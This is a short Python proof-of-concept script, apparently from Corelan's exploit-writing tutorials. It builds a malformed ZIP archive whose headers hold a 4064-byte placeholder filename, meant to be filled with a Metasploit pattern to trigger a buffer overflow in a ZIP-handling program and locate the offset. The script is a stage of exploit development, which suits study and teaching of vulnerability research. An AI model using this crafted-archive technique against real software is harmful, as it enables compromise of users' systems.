#!/usr/bin/env python

# Original Author : corelanc0d3r
# Python POC Author: d3c3pt10n
# http://www.corelan.be:8800
#
# Original: March 2010
# Updated: October 2018

from os import remove


filename = "corelanboom.zip"

ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"  # Size of central directory (bytes)
    "\x02\x10\x00\x00"  # Offset of start of central directory,
    # relative to start of archive
    "\x00\x00"
)

payload = "paste your 4064 byte metasploit pattern here"
payload = payload + ".txt"
payload_len = len(payload)

print("Size : {length} bytes".format(length=payload_len))
print("Removing old {filename} file".format(filename=filename))
remove(filename)
print("Creating new {filename} file".format(filename=filename))
with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
    f.write(file_content)
